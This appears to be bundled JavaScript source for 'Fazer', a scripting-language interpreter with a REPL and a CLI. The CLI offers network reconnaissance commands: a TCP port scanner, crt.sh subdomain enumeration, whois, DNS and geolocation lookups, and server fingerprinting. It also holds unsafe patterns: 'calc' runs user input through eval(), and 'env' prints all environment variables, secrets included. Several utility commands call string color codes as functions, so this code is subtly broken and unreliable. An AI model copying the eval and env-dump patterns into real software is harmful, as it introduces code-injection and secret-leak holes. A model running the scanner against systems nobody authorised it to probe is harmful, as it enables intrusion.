  async _execStmt(stmt, scope) {
    await this._debugCheck(stmt, scope);
    switch (stmt.type) {
      case "assign": {
        const val = await this._eval(stmt.value, scope);
        if (scope.get(stmt.name)) {
          scope.assign(stmt.name, val);
        } else {
          scope.set(stmt.name, val, stmt.mut);
        }
        return val;
      }
      case "exprstmt":
        return await this._eval(stmt.expr, scope);
      case "fn": {
        this.fns.set(stmt.name, { params: stmt.params, body: stmt.body, closure: scope });
        scope.set(stmt.name, { __fnref__: stmt.name }, false);
        return null;
      }
      case "return": {
        const v = stmt.value ? await this._eval(stmt.value, scope) : null;
        return new ReturnSignal(v);
      }
      case "if": {
        const cond = await this._eval(stmt.expr, scope);
        if (truthy(cond)) {
          const inner = new Scope(scope);
          const out = await this._execBlock(stmt.thenBlock, inner);
          if (out instanceof ReturnSignal) return out;
          return out;
        } else if (stmt.elseBlock) {
          const inner = new Scope(scope);
          const out = await this._execBlock(stmt.elseBlock, inner);
          if (out instanceof ReturnSignal) return out;
          return out;
        }
        return null;
      }
      case "while": {
        let last2 = null;
        while (await this._eval(stmt.expr, scope)) {
          const inner = new Scope(scope);
          const out = await this._execBlock(stmt.body, inner);
          if (out instanceof ReturnSignal) return out;
          last2 = out;
        }
        return last2;
      }
      case "try": {
        try {
          const inner = new Scope(scope);
          const out = await this._execBlock(stmt.tryBlock, inner);
          if (out instanceof ReturnSignal) return out;
          return out;
        } catch (e) {
          const inner = new Scope(scope);
          inner.set(stmt.errVar, e.message || String(e), false);
          const out = await this._execBlock(stmt.catchBlock, inner);
          if (out instanceof ReturnSignal) return out;
          return out;
        }
      }
      case "case": {
        const val = await this._eval(stmt.expr, scope);
        for (const arm of stmt.arms) {
          const { matched, bindings } = await this._matchPattern(val, arm.pat, scope);
          if (matched) {
            const inner = new Scope(scope);
            for (const [k, v] of Object.entries(bindings)) inner.set(k, v, true);
            const out = await this._execBlock(arm.body, inner);
            if (out instanceof ReturnSignal) return out;
            return out;
          }
        }
        return null;
      }
      default:
        throw new FazerError(`Unknown statement type: ${stmt.type}`);
    }
  }
  async _eval(expr, scope) {
    if (!expr) return null;
    await this._debugCheck(expr, scope);
    switch (expr.type) {
      case "await": {
        const v = await this._eval(expr.expr, scope);
        if (v && typeof v === "object" && typeof v.then === "function") {
          return await v;
        }
        return v;
      }
      case "num":
      case "str":
      case "bool":
        return expr.value;
      case "null":
        return null;
      case "list": {
        const items = [];
        for (const it of expr.items) items.push(await this._eval(it, scope));
        return items;
      }
      case "map": {
        const o = {};
        for (const ent of expr.entries) {
          const k = await this._eval(ent.key, scope);
          o[String(k)] = await this._eval(ent.value, scope);
        }
        return o;
      }
      case "fn": {
        const anonName = `__anon_${Math.random().toString(36).substr(2)}`;
        this.fns.set(anonName, { params: expr.params, body: expr.body, closure: scope });
        return { __fnref__: anonName };
      }
      case "ident": {
        const cell = scope.get(expr.name);
        if (!cell) throw new FazerError(`Undefined variable '${expr.name}'`);
        const v = cell.value;
        if (v && typeof v === "object" && v.__fnref__) return v;
        return v;
      }
      case "un": {
        const v = await this._eval(expr.expr, scope);
        if (expr.op === "not") return !truthy(v);
        if (expr.op === "-") return -Number(v);
        throw new FazerError(`Unknown unary op ${expr.op}`);
      }
      case "bin": {
        if (expr.op === "and") {
          const l2 = await this._eval(expr.left, scope);
          if (!truthy(l2)) return l2;
          return await this._eval(expr.right, scope);
        }
        if (expr.op === "or") {
          const l2 = await this._eval(expr.left, scope);
          if (truthy(l2)) return l2;
          return await this._eval(expr.right, scope);
        }
        const l = await this._eval(expr.left, scope);
        const r = await this._eval(expr.right, scope);
        switch (expr.op) {
          case "+":
            return typeof l === "string" || typeof r === "string" ? String(l) + String(r) : Number(l) + Number(r);
          case "-":
            return Number(l) - Number(r);
          case "*":
            return Number(l) * Number(r);
          case "/":
            return Number(l) / Number(r);
          case "%":
            return Number(l) % Number(r);
          case "==":
            return deepEqual(l, r);
          case "!=":
            return !deepEqual(l, r);
          case ">":
            return Number(l) > Number(r);
          case "<":
            return Number(l) < Number(r);
          case ">=":
            return Number(l) >= Number(r);
          case "<=":
            return Number(l) <= Number(r);
          default:
            throw new FazerError(`Unknown binary op ${expr.op}`);
        }
      }
      case "get": {
        const obj = await this._eval(expr.obj, scope);
        const key = await this._eval(expr.key, scope);
        const v = obj == null ? null : obj[String(key)];
        return v === void 0 ? null : v;
      }
      case "idx": {
        const obj = await this._eval(expr.obj, scope);
        const idx = await this._eval(expr.idx, scope);
        if (obj == null) return null;
        if (Array.isArray(obj)) return obj[Number(idx)] === void 0 ? null : obj[Number(idx)];
        return obj[String(idx)] === void 0 ? null : obj[String(idx)];
      }
      case "call": {
        if (expr.callee.type === "get") {
          const obj = await this._eval(expr.callee.obj, scope);
          if (obj != null) {
            const key = await this._eval(expr.callee.key, scope);
            const func = obj[String(key)];
            if (typeof func === "function") {
              const args3 = [];
              for (const a of expr.args) args3.push(await this._eval(a, scope));
              return await func.apply(obj, args3);
            }
          }
        }
        const callee = await this._eval(expr.callee, scope);
        const args2 = [];
        for (const a of expr.args) args2.push(await this._eval(a, scope));
        return await this._call(callee, args2, scope);
      }
      case "pipe": {
        const leftVal = await this._eval(expr.left, scope);
        const rightNode = expr.right;
        if (rightNode.type === "call") {
          const callee = await this._eval(rightNode.callee, scope);
          const args2 = [leftVal];
          for (const a of rightNode.args) args2.push(await this._eval(a, scope));
          return await this._call(callee, args2, scope);
        }
        if (rightNode.type === "ident") {
          const fn2 = await this._eval(rightNode, scope);
          return await this._call(fn2, [leftVal], scope);
        }
        const fn = await this._eval(rightNode, scope);
        return await this._call(fn, [leftVal], scope);
      }
      default:
        throw new FazerError(`Unknown expression type: ${expr.type}`);
    }
  }
  async _call(callee, args2, scope) {
    if (typeof callee === "function") {
      const name = callee.name || "native";
      if (this.traceMode) {
        console.log(`[TRACE] Native: ${name}(${args2.map((a) => {
          try {
            return JSON.stringify(a);
          } catch (e) {
            return String(a);
          }
        }).join(", ")})`);
      }
      let start = 0;
      if (this.profiling) start = Date.now();
      const res = await callee(...args2);
      if (this.profiling) {
        const elapsed = Date.now() - start;
        const key = `[native] ${name}`;
        const stat = this.profileData.get(key) || { count: 0, time: 0 };
        stat.count++;
        stat.time += elapsed;
        this.profileData.set(key, stat);
      }
      return res;
    }
    if (typeof callee === "string") {
      if (this.fns.has(callee)) {
        callee = { __fnref__: callee };
      } else {
        const cell = scope.get(callee);
        if (cell && cell.value && cell.value.__fnref__) {
          callee = cell.value;
        }
      }
    }
    if (callee && typeof callee === "object" && callee.__fnref__) {
      const name = callee.__fnref__;
      if (this.traceMode) {
        console.log(`[TRACE] Call: ${name}(${args2.map((a) => {
          try {
            return JSON.stringify(a);
          } catch (e) {
            return String(a);
          }
        }).join(", ")})`);
      }
      const fn = this.fns.get(name);
      if (!fn) throw new FazerError(`Unknown function '${name}'`);
      if (args2.length !== fn.params.length) {
        throw new FazerError(`Arity mismatch: ${name} expects ${fn.params.length}, got ${args2.length}`);
      }
      let start = 0;
      if (this.profiling) start = Date.now();
      const inner = new Scope(fn.closure);
      for (let i = 0; i < fn.params.length; i++) inner.set(fn.params[i], args2[i], true);
      const out = await this._execBlock(fn.body, inner);
      if (this.profiling) {
        const elapsed = Date.now() - start;
        const stat = this.profileData.get(name) || { count: 0, time: 0 };
        stat.count++;
        stat.time += elapsed;
        this.profileData.set(name, stat);
      }
      if (out instanceof ReturnSignal) return out.value;
      return out;
    }
    throw new FazerError(`Value is not callable`);
  }
  async _matchPattern(value, pat, scope) {
    if (!pat) return { matched: false, bindings: {} };
    if (pat.type === "else") return { matched: true, bindings: {} };
    if (pat.type === "identPat") {
      return { matched: true, bindings: { [pat.name]: value } };
    }
    if (pat.type === "cmpPat") {
      const rhs = await this._eval(pat.rhs, scope);
      const op = pat.op;
      let m = false;
      if (op === "==") m = deepEqual(value, rhs);
      else if (op === "!=") m = !deepEqual(value, rhs);
      else if (op === ">") m = value > rhs;
      else if (op === "<") m = value < rhs;
      else if (op === ">=") m = value >= rhs;
      else if (op === "<=") m = value <= rhs;
      return { matched: m, bindings: {} };
    }
    if (pat.type === "num" || pat.type === "str" || pat.type === "bool") {
      return { matched: deepEqual(value, pat.value), bindings: {} };
    }
    if (pat.type === "null") {
      return { matched: value === null, bindings: {} };
    }
    return { matched: false, bindings: {} };
  }
};
function unescapeString(rawTokenImage) {
  const s = rawTokenImage.slice(1, -1);
  return s.replace(/\\n/g, "\n").replace(/\\r/g, "\r").replace(/\\t/g, "	").replace(/\\"/g, '"').replace(/\\\\/g, "\\");
}
function locOf(tok) {
  return {
    offset: tok.startOffset,
    line: tok.startLine,
    col: tok.startColumn,
    endOffset: tok.endOffset,
    endLine: tok.endLine,
    endCol: tok.endColumn
  };
}
function truthy(v) {
  return !!v;
}
function deepEqual(a, b) {
  if (a === b) return true;
  if (a == null || b == null) return a === b;
  if (typeof a !== typeof b) return false;
  if (Array.isArray(a) && Array.isArray(b)) {
    if (a.length !== b.length) return false;
    for (let i = 0; i < a.length; i++) if (!deepEqual(a[i], b[i])) return false;
    return true;
  }
  if (typeof a === "object" && typeof b === "object") {
    const ka = Object.keys(a);
    const kb = Object.keys(b);
    if (ka.length !== kb.length) return false;
    for (const k of ka) if (!deepEqual(a[k], b[k])) return false;
    return true;
  }
  return false;
}
function prettyError(err, filename, code2) {
  const lines = String(code2).split(/\r?\n/);
  const meta = err && err.meta ? err.meta : null;
  if (!meta || !meta.line) return `${err.name}: ${err.message}`;
  const lineNo = meta.line;
  const col = meta.col || 1;
  const line = lines[lineNo - 1] ?? "";
  const caret = " ".repeat(Math.max(0, col - 1)) + "^";
  return [
    `${err.name}: ${err.message}`,
    `at ${filename}:${lineNo}:${col}`,
    line,
    caret
  ].join("\n");
}
async function repl(permissions2 = null) {
  const readline = require("readline");
  const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: "\x1B[36mfz>\x1B[0m "
  });
  const version = require_package().version;
  const arch = process.arch;
  const platform = process.platform;
  process.title = `Fazer v${version}`;
  console.log(`Fazer v${version} (${platform}-${arch})`);
  console.log(`Type "help", "copyright" or "license" for more information.`);
  console.log(`Type "load('file.fz')" to execute a script.`);
  const rt2 = new FazerRuntime({ filename: "<repl>", args: [], permissions: permissions2 });
  rt2.global.set("load", (p) => {
    const pAbs = path.resolve(String(p));
    if (!fs.existsSync(pAbs)) throw new FazerError("File not found: " + p);
    const code2 = fs.readFileSync(pAbs, "utf8");
    const lex = lexer.tokenize(code2);
    if (lex.errors.length) throw new FazerError("Lexer error: " + lex.errors[0].message);
    const parser = new FazerParser();
    parser.input = lex.tokens;
    const ast2 = parser.program();
    if (parser.errors.length) throw new FazerError("Parser error: " + parser.errors[0].message);
    return rt2.run(ast2);
  }, false);
  rl.prompt();
  for await (const line of rl) {
    const code2 = line.trim();
    if (code2 === "exit") break;
    if (code2 === "") {
      rl.prompt();
      continue;
    }
    try {
      const lex = lexer.tokenize(code2);
      if (lex.errors.length) {
        console.error("Syntax Error: " + lex.errors[0].message);
      } else {
        const parser = new FazerParser();
        parser.input = lex.tokens;
        const ast2 = parser.program();
        if (parser.errors.length) {
          console.error("Parse Error: " + parser.errors[0].message);
        } else {
          const res = await rt2.run(ast2);
          if (res !== null && res !== void 0) {
            const builtins = rt2.global.get("__builtins__");
            if (builtins && builtins.style) {
              console.log(builtins.style(res, "green"));
            } else {
              console.log("\x1B[32m" + String(res) + "\x1B[0m");
            }
          }
        }
      }
    } catch (e) {
      console.error("\x1B[31mError: " + (e.message || e) + "\x1B[0m");
    }
    rl.prompt();
  }
}
function usage() {
  console.log(`
Fazer v${require_package().version} \u2014 The next-gen pipe-based language.

Usage:
  fazer                     Start interactive shell (REPL)
  fazer <file.fz> [args...] Run a Fazer script
  fazer run <file.fz>       Run a Fazer script (explicit)

CLI Commands:
  Network/OSINT:
    geo, scan, whois, sub, dns, tech, headers, ip, ping, 
    ssl, curl, robots
  
  Crypto/Encoding:
    b64, hex, url, md5, sha1, sha256, uuid
    
  System/Utils:
    ls, cat, grep, wc, whoami, env, pass, calc, now, coin, dice

Flags:
  --help, -h                Show this help message
  --version, -v             Show version
  --license                 Show license information
`);
  process.exit(0);
}
function printLicense() {
  console.log(`
Fazer Language
Copyright (c) 2026 L'EMPRISE

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
`);
  process.exit(0);
}
async function main() {
  let argv = process.argv.slice(2);
  const permissions = /* @__PURE__ */ new Set(["fs", "net", "exec", "osint"]);
  const newArgv = [];
  for (let i = 0; i < argv.length; i++) {
    const arg = argv[i];
    if (arg === "--deny-all") {
      permissions.clear();
    } else if (arg.startsWith("--deny-")) {
      permissions.delete(arg.substring(7));
    } else if (arg.startsWith("--allow-")) {
      permissions.add(arg.substring(8));
    } else {
      newArgv.push(arg);
    }
  }
  argv = newArgv;
  if (argv.length === 0) {
    await repl(permissions);
    return;
  }
  const cmd = argv[0];
  if (cmd === "--help" || cmd === "-h") {
    usage();
  }
  if (cmd === "--version" || cmd === "-v") {
    console.log(`Fazer v${require_package().version}`);
    process.exit(0);
  }
  if (cmd === "--license") {
    printLicense();
  }
  const colors = {
    red: "\x1B[31m",
    green: "\x1B[32m",
    yellow: "\x1B[33m",
    blue: "\x1B[34m",
    magenta: "\x1B[35m",
    cyan: "\x1B[36m",
    reset: "\x1B[0m",
    bold: "\x1B[1m"
  };
  const CLI_COMMANDS = {
    // --- OSINT / NETWORK ---
    "geo": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer geo <ip/domain>${colors.reset}`);
      const target = args2[0];
      console.log(`${colors.cyan}[*] Geo-locating: ${target}...${colors.reset}`);
      const http2 = require("http");
      http2.get(`http://ip-api.com/json/${target}`, (res) => {
        let data = "";
        res.on("data", (c) => data += c);
        res.on("end", () => {
          try {
            const j = JSON.parse(data);
            if (j.status === "fail") {
              console.log(`${colors.red}[!] Failed: ${j.message}${colors.reset}`);
              return;
            }
            console.log(`${colors.green}[+] Target: ${j.query}${colors.reset}`);
            console.log(`    ${colors.bold}Country:${colors.reset} ${j.country} (${j.countryCode})`);
            console.log(`    ${colors.bold}Region:${colors.reset}  ${j.regionName} (${j.region})`);
            console.log(`    ${colors.bold}City:${colors.reset}    ${j.city}`);
            console.log(`    ${colors.bold}ISP:${colors.reset}     ${j.isp}`);
            console.log(`    ${colors.bold}Org:${colors.reset}     ${j.org}`);
            console.log(`    ${colors.bold}AS:${colors.reset}      ${j.as}`);
            console.log(`    ${colors.bold}Loc:${colors.reset}     ${j.lat}, ${j.lon}`);
            console.log(`    ${colors.blue}Maps:${colors.reset}    https://www.google.com/maps?q=${j.lat},${j.lon}`);
          } catch (e) {
            console.error(e.message);
          }
        });
      }).on("error", (e) => console.error(e.message));
    },
    "ip": async (args2) => {
      console.log(`${colors.cyan}[*] Fetching public IP...${colors.reset}`);
      const https2 = require("https");
      https2.get("https://api.ipify.org?format=json", (res) => {
        let data = "";
        res.on("data", (c) => data += c);
        res.on("end", () => {
          try {
            const j = JSON.parse(data);
            console.log(`${colors.green}[+] Public IP: ${colors.bold}${j.ip}${colors.reset}`);
          } catch (e) {
            console.error("Error parsing response");
          }
        });
      }).on("error", (e) => console.error(e.message));
    },
    "ping": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer ping <host> [port]${colors.reset}`);
      const host = args2[0];
      const port = args2[1] ? parseInt(args2[1]) : 80;
      console.log(`${colors.cyan}[*] Pinging ${host}:${port}...${colors.reset}`);
      const net = require("net");
      const start = Date.now();
      const s = new net.Socket();
      s.setTimeout(2e3);
      s.on("connect", () => {
        const ms = Date.now() - start;
        console.log(`${colors.green}[+] Connected to ${host}:${port} in ${ms}ms${colors.reset}`);
        s.destroy();
      });
      s.on("timeout", () => {
        console.log(`${colors.red}[!] Timeout${colors.reset}`);
        s.destroy();
      });
      s.on("error", (e) => {
        console.log(`${colors.red}[!] Error: ${e.message}${colors.reset}`);
      });
      s.connect(port, host);
    },
    "scan": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer scan <host> [ports/range]${colors.reset}`);
      const host = args2[0];
      let ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443];
      if (args2[1]) {
        if (args2[1] === "full") ports = Array.from({ length: 1024 }, (_, i) => i + 1);
        else ports = args2[1].split(",").map((p) => parseInt(p.trim())).filter((n) => !isNaN(n));
      }
      console.log(`${colors.cyan}[*] Scanning ${host} (${ports.length} ports)...${colors.reset}`);
      const net = require("net");
      const checkPort = (port) => new Promise((resolve) => {
        const s = new net.Socket();
        s.setTimeout(2e3);
        s.on("connect", () => {
          s.destroy();
          resolve(port);
        });
        s.on("timeout", () => {
          s.destroy();
          resolve(null);
        });
        s.on("error", () => resolve(null));
        s.connect(port, host);
      });
      const results = await Promise.all(ports.map(checkPort));
      const open = results.filter((p) => p !== null);
      if (open.length === 0) console.log(`${colors.yellow}[-] No open ports found.${colors.reset}`);
      else {
        console.log(`${colors.green}[+] Found ${open.length} open ports:${colors.reset}`);
        open.forEach((p) => console.log(`    - ${colors.bold}${p}${colors.reset} (OPEN)`));
      }
    },
    "whois": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer whois <domain>${colors.reset}`);
      const domain = args2[0];
      console.log(`${colors.cyan}[*] WHOIS Lookup for: ${domain}...${colors.reset}`);
      const queryWhois = (server, query) => new Promise((resolve, reject2) => {
        const net = require("net");
        const s = new net.Socket();
        let data = "";
        s.connect(43, server, () => s.write(query + "\r\n"));
        s.on("data", (d) => data += d);
        s.on("end", () => resolve(data));
        s.on("error", reject2);
      });
      try {
        let res = await queryWhois("whois.iana.org", domain);
        let refer = res.match(/refer:\s+(.+)/i);
        if (refer && refer[1]) {
          const server = refer[1].trim();
          console.log(`${colors.blue}[i] Redirected to ${server}${colors.reset}`);
          res = await queryWhois(server, domain);
        } else {
          if (domain.endsWith(".com") || domain.endsWith(".net")) {
            res = await queryWhois("whois.verisign-grs.com", domain);
          }
        }
        console.log(res);
      } catch (e) {
        console.error(`${colors.red}[!] Error: ${e.message}${colors.reset}`);
      }
    },
    "dns": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer dns <domain>${colors.reset}`);
      const domain = args2[0];
      const dns = require("dns").promises;
      console.log(`${colors.cyan}[*] DNS Records for: ${domain}${colors.reset}`);
      const types = ["A", "AAAA", "MX", "TXT", "NS", "SOA", "CNAME"];
      for (const t of types) {
        try {
          const res = await dns.resolve(domain, t);
          console.log(`${colors.bold}[${t}]${colors.reset}`);
          if (Array.isArray(res)) res.forEach((r) => console.log(`    ${typeof r === "object" ? JSON.stringify(r) : r}`));
          else console.log(`    ${JSON.stringify(res)}`);
        } catch (e) {
        }
      }
    },
    "sub": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer sub <domain>${colors.reset}`);
      const domain = args2[0];
      console.log(`${colors.cyan}[*] Enumerating subdomains for: ${domain} (via crt.sh)...${colors.reset}`);
      const https2 = require("https");
      const fetch = (u) => new Promise((resolve, reject2) => {
        const req = https2.get(u, { headers: { "User-Agent": "Mozilla/5.0" } }, (res) => {
          let d = "";
          res.on("data", (c) => d += c);
          res.on("end", () => resolve(d));
        });
        req.on("error", reject2);
      });
      try {
        const data = await fetch(`https://crt.sh/?q=%.${domain}&output=json`);
        let json = [];
        try {
          json = JSON.parse(data);
        } catch (e) {
          console.log(`${colors.red}[!] Invalid response${colors.reset}`);
          return;
        }
        const subs = /* @__PURE__ */ new Set();
        json.forEach((entry) => {
          entry.name_value.split("\n").forEach((s) => subs.add(s));
        });
        console.log(`${colors.green}[+] Found ${subs.size} unique subdomains:${colors.reset}`);
        Array.from(subs).sort().forEach((s) => console.log(`    ${s}`));
      } catch (e) {
        console.error(`${colors.red}[!] Error: ${e.message}${colors.reset}`);
      }
    },
    "headers": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer headers <url>${colors.reset}`);
      let u = args2[0];
      if (!u.startsWith("http")) u = "https://" + u;
      console.log(`${colors.cyan}[*] Fetching headers: ${u}...${colors.reset}`);
      const proto = u.startsWith("https") ? require("https") : require("http");
      proto.get(u, (res) => {
        console.log(`${colors.green}[${res.statusCode} ${res.statusMessage}]${colors.reset}`);
        Object.keys(res.headers).forEach((k) => console.log(`${colors.bold}${k}${colors.reset}: ${res.headers[k]}`));
      }).on("error", (e) => console.error(e.message));
    },
    "tech": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer tech <url>${colors.reset}`);
      let u = args2[0];
      if (!u.startsWith("http")) u = "https://" + u;
      console.log(`${colors.cyan}[*] Detecting tech: ${u}...${colors.reset}`);
      const proto = u.startsWith("https") ? require("https") : require("http");
      proto.get(u, (res) => {
        const h = res.headers;
        console.log(`${colors.bold}Server:${colors.reset}       ${h["server"] || "Unknown"}`);
        console.log(`${colors.bold}X-Powered-By:${colors.reset} ${h["x-powered-by"] || "Unknown"}`);
        if (h["set-cookie"]) {
          h["set-cookie"].forEach((c) => {
            if (c.includes("PHPSESSID")) console.log(`${colors.magenta}[!] PHP Detected${colors.reset}`);
            if (c.includes("JSESSIONID")) console.log(`${colors.magenta}[!] Java Detected${colors.reset}`);
            if (c.includes("ASP.NET")) console.log(`${colors.magenta}[!] ASP.NET Detected${colors.reset}`);
          });
        }
      }).on("error", (e) => console.error(e.message));
    },
    "ssl": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer ssl <host> [port]${colors.reset}`);
      const host = args2[0];
      const port = args2[1] || 443;
      console.log(`${colors.cyan}[*] Inspecting SSL: ${host}:${port}...${colors.reset}`);
      const tls = require("tls");
      const socket = tls.connect(port, host, { servername: host }, () => {
        const cert = socket.getPeerCertificate();
        if (socket.authorized) console.log(`${colors.green}[+] Authorized${colors.reset}`);
        else console.log(`${colors.yellow}[!] Unauthorized: ${socket.authorizationError}${colors.reset}`);
        console.log(`${colors.bold}Subject:${colors.reset} ${cert.subject.CN} (${cert.subject.O})`);
        console.log(`${colors.bold}Issuer:${colors.reset}  ${cert.issuer.CN} (${cert.issuer.O})`);
        console.log(`${colors.bold}Valid:${colors.reset}   ${cert.valid_from} to ${cert.valid_to}`);
        console.log(`${colors.bold}Fingerprint:${colors.reset} ${cert.fingerprint}`);
        socket.destroy();
      });
      socket.on("error", (e) => console.error(e.message));
    },
    "curl": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer curl <url>${colors.reset}`);
      let u = args2[0];
      if (!u.startsWith("http")) u = "https://" + u;
      const proto = u.startsWith("https") ? require("https") : require("http");
      proto.get(u, (res) => {
        res.pipe(process.stdout);
      }).on("error", (e) => console.error(e.message));
    },
    "robots": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer robots <url>${colors.reset}`);
      let u = args2[0];
      if (!u.startsWith("http")) u = "https://" + u;
      u = u.endsWith("/") ? u + "robots.txt" : u + "/robots.txt";
      console.log(`${colors.cyan}[*] Fetching ${u}...${colors.reset}`);
      const proto = u.startsWith("https") ? require("https") : require("http");
      proto.get(u, (res) => {
        if (res.statusCode !== 200) console.log(`${colors.yellow}[!] Status: ${res.statusCode}${colors.reset}`);
        res.pipe(process.stdout);
      }).on("error", (e) => console.error(e.message));
    },
    // --- CRYPTO / ENCODING ---
    "b64": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer b64 <enc/dec> <string>${colors.reset}`);
      const mode = args2[0];
      const str = args2.slice(1).join(" ");
      if (mode === "enc") console.log(Buffer.from(str).toString("base64"));
      else if (mode === "dec") console.log(Buffer.from(str, "base64").toString("utf8"));
      else console.log("Unknown mode. Use enc or dec.");
    },
    "hex": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer hex <enc/dec> <string>${colors.reset}`);
      const mode = args2[0];
      const str = args2.slice(1).join(" ");
      if (mode === "enc") console.log(Buffer.from(str).toString("hex"));
      else if (mode === "dec") console.log(Buffer.from(str, "hex").toString("utf8"));
    },
    "md5": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer md5 <string>${colors.reset}`);
      console.log(require("crypto").createHash("md5").update(args2.join(" ")).digest("hex"));
    },
    "sha1": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer sha1 <string>${colors.reset}`);
      console.log(require("crypto").createHash("sha1").update(args2.join(" ")).digest("hex"));
    },
    "sha256": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer sha256 <string>${colors.reset}`);
      console.log(require("crypto").createHash("sha256").update(args2.join(" ")).digest("hex"));
    },
    "url": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer url <enc/dec> <string>${colors.reset}`);
      const mode = args2[0];
      const str = args2.slice(1).join(" ");
      if (mode === "enc") console.log(encodeURIComponent(str));
      else if (mode === "dec") console.log(decodeURIComponent(str));
    },
    "uuid": async (args2) => {
      console.log(require("crypto").randomUUID());
    },
    // --- SYSTEM / UTILS ---
    "ls": async (args2) => {
      const fs2 = require("fs");
      const p = args2[0] || ".";
      try {
        const files = fs2.readdirSync(p);
        files.forEach((f) => {
          const stat = fs2.statSync(require("path").join(p, f));
          const isDir = stat.isDirectory();
          console.log(isDir ? `${colors.blue}${f}/${colors.reset}` : f);
        });
      } catch (e) {
        console.error(e.message);
      }
    },
    "cat": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer cat <file>${colors.reset}`);
      try {
        require("fs").createReadStream(args2[0]).pipe(process.stdout);
      } catch (e) {
        console.error(e.message);
      }
    },
    "grep": async (args2) => {
      if (!args2[1]) return console.log(`${colors.red}Usage: fazer grep <pattern> <file>${colors.reset}`);
      const pat = new RegExp(args2[0]);
      const file = args2[1];
      try {
        const content = require("fs").readFileSync(file, "utf8");
        content.split("\n").forEach((line, i) => {
          if (pat.test(line)) console.log(`${colors.magenta}${i + 1}:${colors.reset} ${line.trim()}`);
        });
      } catch (e) {
        console.error(e.message);
      }
    },
    "wc": async (args2) => {
      if (!args2[0]) return console.log(`${colors.red}Usage: fazer wc <file>${colors.reset}`);
      try {
        const c = require("fs").readFileSync(args2[0], "utf8");
        console.log(`Lines: ${c.split("\n").length}, Chars: ${c.length}`);
      } catch (e) {
        console.error(e.message);
      }
    },
    "whoami": async (args2) => {
      const os2 = require("os");
      console.log(`${os2.userInfo().username} @ ${os2.hostname()} (${os2.platform()} ${os2.release()})`);
    },
    "env": async (args2) => {
      Object.keys(process.env).forEach((k) => console.log(`${colors.bold}${k}${colors.reset}=${process.env[k]}`));
    },
    "pass": async (args2) => {
      const len = args2[0] ? parseInt(args2[0]) : 16;
      const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+";
      let res = "";
      for (let i = 0; i < len; i++) res += chars.charAt(Math.floor(Math.random() * chars.length));
      console.log(res);
    },
    "calc": async (args) => {
      if (!args[0]) return console.log(`${colors.red}Usage: fazer calc <expr>${colors.reset}`);
      try {
        console.log(eval(args.join(" ")));
      } catch (e) {
        console.error("Error");
      }
    },
    "now": async (args2) => {
      console.log((/* @__PURE__ */ new Date()).toISOString());
      console.log("Timestamp: " + Date.now());
    },
    "coin": async (args2) => {
      const r = Math.random() < 0.5 ? "Pile (Heads)" : "Face (Tails)";
      console.log(colors.yellow(r));
    },
    "dice": async (args2) => {
      const r = Math.floor(Math.random() * 6) + 1;
      console.log(colors.yellow("\u{1F3B2} " + r));
    },
    "uptime": async (args2) => {
      const up = process.uptime();
      const h = Math.floor(up / 3600);
      const m = Math.floor(up % 3600 / 60);
      const s = Math.floor(up % 60);
      console.log(colors.cyan(`Uptime: ${h}h ${m}m ${s}s`));
    },
    "mem": async (args2) => {
      const used = process.memoryUsage();
      console.log(colors.cyan("Memory Usage:"));
      console.log(`  RSS:       ${Math.round(used.rss / 1024 / 1024)} MB`);
      console.log(`  Heap Used: ${Math.round(used.heapUsed / 1024 / 1024)} MB`);
      console.log(`  External:  ${Math.round(used.external / 1024 / 1024)} MB`);
    },
    "disk": async (args2) => {
      try {
        require("child_process").exec("wmic logicaldisk get size,freespace,caption", (err, stdout) => {
          if (err) console.log(colors.red("Error fetching disk info"));
          else console.log(colors.cyan(stdout.trim()));
        });
      } catch (e) {
        console.log(colors.red("Disk info unavailable"));
      }
    },
    "rot13": async (args2) => {
      if (!args2[0]) return console.log(colors.red("Usage: fazer rot13 <text>"));
      const input = args2.join(" ");
      const out = input.replace(/[a-zA-Z]/g, (c) => {
        const base = c <= "Z" ? 65 : 97;
        return String.fromCharCode(base + (c.charCodeAt(0) - base + 13) % 26);
      });
      console.log(colors.green(out));
    },
    "reverse": async (args2) => {
      if (!args2[0]) return console.log(colors.red("Usage: fazer reverse <text>"));
